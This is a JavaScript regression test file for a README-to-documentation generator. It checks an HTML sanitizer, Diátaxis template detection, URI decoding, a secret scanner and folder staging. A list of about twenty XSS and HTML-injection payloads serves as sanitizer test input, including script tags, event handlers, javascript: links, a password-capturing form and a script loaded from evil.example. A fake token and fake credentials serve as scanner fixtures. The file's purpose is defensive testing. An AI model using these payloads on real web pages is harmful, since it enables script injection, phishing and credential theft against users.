// Regression tests for the release-blocking fixes: README HTML sanitizing, Diátaxis
// template detection, malformed % links, and secret-scanner placeholder handling.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { raw } from 'hast-util-raw'; // the parser Docusaurus uses for HTML in .md files
import { sanitizeTree } from '../../site/src/plugins/rehype-sanitize-readme.mjs';
import { buildPages, looksLikeTemplate, safeDecodeURI } from '../lib/markdown.mjs';
import { allocateRepoFolders, allocateVersionFolders } from '../lib/folders.mjs';
import { commitStage } from '../lib/staging.mjs';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { findSecrets, redactSecrets } from '../lib/secrets.mjs';

// Parse HTML the way rehype-raw does, sanitize, and return a tiny serialization.
function clean(html) {
  const tree = raw({ type: 'root', children: [{ type: 'raw', value: html }] });
  sanitizeTree(tree);
  const out = [];
  (function walk(n) {
    for (const c of n.children || []) {
      if (c.type === 'text') out.push(c.value);
      else if (c.type === 'element') {
        const attrs = Object.entries(c.properties || {}).map(([k, v]) => ` ${k}="${Array.isArray(v) ? v.join(' ') : v}"`).join('');
        out.push(`<${c.tagName}${attrs}>`);
        walk(c);
        out.push(`</${c.tagName}>`);
      }
    }
  })(tree);
  return out.join('');
}

const ATTACKS = {
  'nested script trick': `<scr<script></script>ipt>alert(1)</script>`,
  'unclosed external script': `<script src="https://evil.example/x.js">`,
  'img onerror': `<img src="x" onerror="alert(1)">`,
  'javascript: link': `<a href="javascript:alert(1)">x</a>`,
  'obfuscated javascript: link': `<a href="jav&#x09;ascript:alert(1)">x</a>`,
  'svg onload': `<svg onload="alert(1)"><circle r="5"/></svg>`,
  'self-closing iframe': `<iframe src="https://evil.example" />`,
  'iframe srcdoc': `<iframe srcdoc="<script>alert(1)</script>"></iframe>`,
  object: `<object data="https://evil.example/x"></object>`,
  embed: `<embed src="https://evil.example/x">`,
  'phishing form': `<form action="https://evil.example"><input name="pw" type="password"><button>Go</button></form>`,
  'meta refresh': `<meta http-equiv="refresh" content="0;url=https://evil.example">`,
  'full-page overlay': `<div style="position:fixed;inset:0;background:red">x</div>`,
  'details ontoggle': `<details open ontoggle="alert(1)"><summary>s</summary>x</details>`,
  'data: link': `<a href="data:text/html,<script>alert(1)</script>">x</a>`,
  'base hijack': `<base href="https://evil.example/">`,
  'stylesheet link': `<link rel="stylesheet" href="https://evil.example/x.css">`,
  'theme class overlay': `<div class="navbar navbar--fixed-top">x</div>`,
  'srcset javascript:': `<img src="ok.png" srcset="javascript:alert(1) 1x">`,
  'video autoplay handler': `<video src="https://example.com/v.mp4" onplay="alert(1)" autoplay></video>`,
};

test('sanitizer neutralizes every known README attack', () => {
  for (const [name, html] of Object.entries(ATTACKS)) {
    const out = clean(html);
    assert.doesNotMatch(out, /<(script|iframe|object|embed|form|button|base|meta|link|svg|style)\b/i, `${name}: ${out}`);
    assert.doesNotMatch(out, /\son[a-z]+=|\sstyle=|\ssrcdoc=|\sautoplay=/i, `${name}: ${out}`);
    assert.doesNotMatch(out, /javascript:|data:text|evil\.example\/x\.css|navbar/i, `${name}: ${out}`);
    assert.doesNotMatch(out, /type="password"/, `${name}: ${out}`);
  }
});

test('sanitizer keeps normal README HTML', () => {
  const html = [
    `<div align="center"><img src="https://img.shields.io/badge/x-y-blue" alt="badge" width="120"></div>`,
    `<p align="center"><a href="https://example.com" target="_blank">site</a> · <a href="#install">install</a> · <a href="mailto:a@b.c">mail</a></p>`,
    `<details><summary>More</summary><p>Hidden <kbd>Ctrl</kbd>+<kbd>C</kbd></p></details>`,
    `<table><tr><th align="left">A</th><td colspan="2">B</td></tr></table>`,
    `<picture><source media="(prefers-color-scheme: dark)" srcset="dark.png"><img src="light.png" alt="logo"></picture>`,
    `<pre><code class="language-js">x</code></pre>`,
    `<video src="https://user-images.githubusercontent.com/v.mp4" controls muted></video>`,
    `<sub>small</sub><sup>1</sup><br><hr>`,
  ].join('\n');
  const out = clean(html);
  for (const keep of [
    '<div align="center">', 'alt="badge"', 'width="120"', 'href="https://example.com"', 'target="_blank"', 'rel="noopener noreferrer"',
    'href="#install"', 'href="mailto:a@b.c"', '<details>', '<summary>', '<kbd>', 'align="left"', 'colSpan="2"',
    '<picture>', 'srcSet="dark.png"', 'className="language-js"', '<video', 'controls="true"', '<sub>', '<sup>', '<br>', '<hr>',
  ]) assert.ok(out.includes(keep), `missing ${keep} in ${out}`);
});

test('sanitizer unwraps unknown tags but keeps their text', () => {
  assert.equal(clean('<font color="red">hello</font>'), 'hello');
  assert.equal(clean('<form><label>Name</label></form>'), 'Name');
});

test('task-list checkboxes survive, other inputs do not', () => {
  assert.match(clean('<input type="checkbox" disabled checked> done'), /<input type="checkbox" disabled="true" checked="true">/);
  assert.equal(clean('<input type="checkbox"> live'), ' live');
  assert.equal(clean('<input type="text" value="x">'), '');
});

test('template detection needs real evidence', () => {
  const L = '\nline\nline\nline\nline';
  const md = (...parts) => parts.join('\n\n');
  // A normal README that merely has one "## Reference" heading is NOT a template.
  assert.equal(looksLikeTemplate(md('## Installation', L, '## Usage', L, '## Reference', L, '## License', 'MIT')), false);
  assert.equal(looksLikeTemplate(md('## Installation', L, '## Reference', L)), false);
  // ICICLE / DocGen template: Diátaxis sections at H1, metadata as H2 before them.
  assert.equal(looksLikeTemplate(md('## References', 'x', '---', '# Tutorials', L, '---', '# Explanation', L)), true);
  assert.equal(looksLikeTemplate(md('## License', 'MIT', '# Tutorials', L)), true);
  assert.equal(looksLikeTemplate(md('## Tutorials', L, '## Reference', L)), true);
  // Anything non-Diátaxis after the template headings at the same level breaks it.
  assert.equal(looksLikeTemplate(md('# Tutorials', L, '# Reference', L, '# License', 'MIT')), false);
});

test('mixed README keeps Installation and License out of the Reference page', () => {
  const repo = { owner: { login: 'o' }, name: 'r', full_name: 'o/r', default_branch: 'main', html_url: 'https://github.com/o/r' };
  const content = { diataxis: 'auto', stopAtHeadings: [], redactSecrets: true, tagsFromReadme: true };
  const L = '\nline\nline\nline\nline';
  const readme = ['# Proj', 'Intro.', '## Installation', L, '## Usage', L, '## Reference', L, '## License', 'MIT license text'].join('\n\n');
  const r = buildPages({ readme, readmePath: 'README.md', repo, ref: 'main', versionLabel: '', content });
  assert.equal(r.structured, false);
  const where = Object.fromEntries(r.sections.filter((s) => s.heading).map((s) => [s.heading, s.category]));
  assert.deepEqual(where, { Installation: 'tutorials', Usage: 'how-to', Reference: 'reference', License: 'overview' });
  const reference = r.pages.find((p) => p.bucket === 'reference').body;
  assert.doesNotMatch(reference, /MIT license text/);
});

test('malformed % in links never crashes ingest', () => {
  assert.equal(safeDecodeURI('docs/100%.md'), 'docs/100%.md');
  assert.equal(safeDecodeURI('docs/a%20b.md'), 'docs/a b.md');
  assert.equal(safeDecodeURI('100% %E2%82%AC'), '100% €');
  const repo = { owner: { login: 'o' }, name: 'r', full_name: 'o/r', default_branch: 'main', html_url: 'https://github.com/o/r' };
  const content = { diataxis: 'auto', stopAtHeadings: [], redactSecrets: true, tagsFromReadme: true };
  const r = buildPages({ readme: '# T\n\nSee [bad](docs/100%.md) and [ok](docs/a%20b.md).', readmePath: 'README.md', repo, ref: 'main', versionLabel: '', content });
  assert.match(r.pages[0].body, /docs\/100%25\.md/);
  assert.match(r.pages[0].body, /docs\/a%20b\.md/);
});

test('secret placeholders are exempt only when clearly fake', () => {
  // Built by concatenation so these test strings never look like secrets to the scanner.
  const real = 'gh' + 'p_' + 'A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8';
  const flagged = (s) => findSecrets(s).length > 0;
  assert.ok(flagged(real));
  assert.ok(!flagged('gh' + 'p_' + 'x'.repeat(36)));
  assert.ok(!flagged('AKIA' + 'IOSFODNN7EXAMPLE'));
  assert.ok(flagged('AKIA' + 'Q7W2E9R4T6Y1U3I8'));
  // "example" in the host no longer exempts a real password; placeholders still are.
  assert.ok(flagged('postgres://admin:' + 'S3cr3tPw9' + '@db.example.com/app'));
  assert.ok(flagged('postgres://admin:' + 'MySecretPassword' + '@db/app'));
  // Weak words can be real credentials, so they are NOT exempt (any more).
  assert.ok(flagged('postgres://user:' + 'password' + '@localhost/db'));
  assert.ok(flagged('postgres://root:' + 'admin123' + '@db/app'));
  assert.ok(!flagged('postgres://user:' + '*****' + '@localhost/db'));
  assert.ok(!flagged('postgres://u:${DB_PASS}@h/db'));
  assert.ok(!flagged('https://user:<token>@host/x'));
  // Substrings like "your" or a trailing "..." no longer hide a real key.
  assert.ok(flagged('sk-' + 'yourAbc123Def456Ghi789Jkl012Mno345Pq'));
  assert.equal(redactSecrets(`token ${real} here`).text, 'token [REDACTED] here');
});

test('a short Diátaxis-named section in a mixed README is not folded into Overview', () => {
  const repo = { owner: { login: 'o' }, name: 'r', full_name: 'o/r', default_branch: 'main', html_url: 'https://github.com/o/r' };
  const content = { diataxis: 'auto', stopAtHeadings: [], redactSecrets: true, tagsFromReadme: true };
  const readme = ['# Proj', 'Intro.', '# Tutorials', 'Step one.', '# Explanation', 'Why.', '# Docker', 'docker run x'].join('\n\n');
  const r = buildPages({ readme, readmePath: 'README.md', repo, ref: 'main', versionLabel: '', content });
  assert.equal(r.structured, false);
  const where = Object.fromEntries(r.sections.filter((s) => s.heading).map((s) => [s.heading, s.category]));
  assert.deepEqual(where, { Tutorials: 'tutorials', Explanation: 'explanation', Docker: 'overview' });
});

test('sanitizer does not crash on tag names that are Object.prototype members', () => {
  for (const tag of ['constructor', 'tostring', 'hasownproperty', 'valueof', '__proto__', 'isprototypeof']) {
    assert.doesNotThrow(() => clean(`<${tag} href="x">kept</${tag}>`), tag);
    assert.match(clean(`<${tag} href="x">kept</${tag}>`), /kept/);
  }
});

test('README headings named like Object.prototype members are ordinary sections', () => {
  const repo = { owner: { login: 'o' }, name: 'r', full_name: 'o/r', default_branch: 'main', html_url: 'https://github.com/o/r' };
  const content = { diataxis: 'auto', stopAtHeadings: [], redactSecrets: true, tagsFromReadme: true };
  const readme = ['# P', 'Intro', '## Constructor', 'new Foo()', '## toString', 'x', '## hasOwnProperty', 'y'].join('\n\n');
  const r = buildPages({ readme, readmePath: 'README.md', repo, ref: 'main', versionLabel: '', content });
  for (const s of r.sections) assert.equal(typeof s.category, 'string');
  assert.ok(r.sections.every((s) => ['overview', 'tutorials', 'how-to', 'reference', 'explanation'].includes(s.category)));
});

test('repo folders are unique, case-insensitive, and avoid reserved names', () => {
  const repo = (full) => ({ full_name: full, name: full.split('/')[1], owner: { login: full.split('/')[0] } });
  // The reviewer's case: a/tool and b/tool clash, and c/a-tool already owns "a-tool".
  let f = allocateRepoFolders([repo('a/tool'), repo('b/tool'), repo('c/a-tool')]);
  const folders = [...f.values()].map((x) => x.folder.toLowerCase());
  assert.equal(new Set(folders).size, 3, folders.join(','));
  assert.equal(f.get('c/a-tool').folder, 'a-tool');
  assert.equal(f.get('a/tool').folder, 'a-tool-2');
  assert.equal(f.get('b/tool').folder, 'b-tool');
  // Case-only differences clash; reserved names never become top-level folders.
  f = allocateRepoFolders([repo('a/Docs'), repo('b/docs'), repo('o/tags'), repo('o/Index')]);
  assert.deepEqual([...f.values()].map((x) => x.folder).sort(), ['a-Docs', 'b-docs', 'o-Index', 'o-tags']);
});

test('release folders never collide with each other or with "next"', () => {
  assert.deepEqual(allocateVersionFolders(['next', 'v1.0'], { reserveNext: true }), ['next-2', 'v1.0']);
  assert.deepEqual(allocateVersionFolders(['V1.0', 'v1.0', 'v1.0']), ['V1.0', 'v1.0-2', 'v1.0-3']);
  assert.deepEqual(allocateVersionFolders(['next']), ['next']);
});

test('staged output replaces the old output, and a failed swap restores it', () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'docgen-stage-'));
  const live = path.join(tmp, 'docs');
  const stage = path.join(tmp, 'stage');
  const backup = path.join(tmp, 'backup');
  const write = (p, t) => (fs.mkdirSync(path.dirname(p), { recursive: true }), fs.writeFileSync(p, t));
  write(path.join(live, 'a', 'page.md'), 'old a');
  write(path.join(live, 'b', 'page.md'), 'old b');
  write(path.join(live, 'mine', 'notes.md'), 'hand-written');
  write(path.join(stage, 'a', 'page.md'), 'new a');
  write(path.join(stage, 'b', 'page.md'), 'new b');
  const job = () => ({ retire: [path.join(live, 'a'), path.join(live, 'b')], installs: [[path.join(stage, 'a'), path.join(live, 'a')], [path.join(stage, 'b'), path.join(live, 'b')]], backupDir: backup });

  // Failure on the second install: everything goes back to the old output.
  let n = 0;
  const flaky = (from, to) => {
    if (from.startsWith(stage) && ++n === 2) throw new Error('disk full (simulated)');
    fs.renameSync(from, to);
  };
  assert.throws(() => commitStage({ ...job(), rename: flaky }), /previous output was restored/);
  assert.equal(fs.readFileSync(path.join(live, 'a', 'page.md'), 'utf8'), 'old a');
  assert.equal(fs.readFileSync(path.join(live, 'b', 'page.md'), 'utf8'), 'old b');
  assert.equal(fs.readFileSync(path.join(live, 'mine', 'notes.md'), 'utf8'), 'hand-written');
  assert.ok(!fs.existsSync(backup));

  // Success: new output in place, hand-written folder untouched.
  commitStage(job());
  assert.equal(fs.readFileSync(path.join(live, 'a', 'page.md'), 'utf8'), 'new a');
  assert.equal(fs.readFileSync(path.join(live, 'b', 'page.md'), 'utf8'), 'new b');
  assert.equal(fs.readFileSync(path.join(live, 'mine', 'notes.md'), 'utf8'), 'hand-written');

  // A hand-written folder in the way is never overwritten.
  write(path.join(stage, 'mine', 'page.md'), 'generated');
  assert.throws(() => commitStage({ retire: [], installs: [[path.join(stage, 'mine'), path.join(live, 'mine')]], backupDir: backup }), /not generated by DocGen/);
  assert.equal(fs.readFileSync(path.join(live, 'mine', 'notes.md'), 'utf8'), 'hand-written');
  fs.rmSync(tmp, { recursive: true, force: true });
});

test('retiring a parent folder allows installing its children (second full ingest)', () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'docgen-stage-'));
  const live = path.join(tmp, 'apis-files');
  const stage = path.join(tmp, 'stage');
  const write = (p, t) => (fs.mkdirSync(path.dirname(p), { recursive: true }), fs.writeFileSync(p, t));
  write(path.join(live, 'sample', 'openapi.json'), 'old');
  write(path.join(stage, 'sample', 'openapi.json'), 'new');
  // Parent retired, child installed: must not be mistaken for hand-written content.
  commitStage({ retire: [live], installs: [[path.join(stage, 'sample'), path.join(live, 'sample')]], backupDir: path.join(tmp, 'b') });
  assert.equal(fs.readFileSync(path.join(live, 'sample', 'openapi.json'), 'utf8'), 'new');
  fs.rmSync(tmp, { recursive: true, force: true });
});
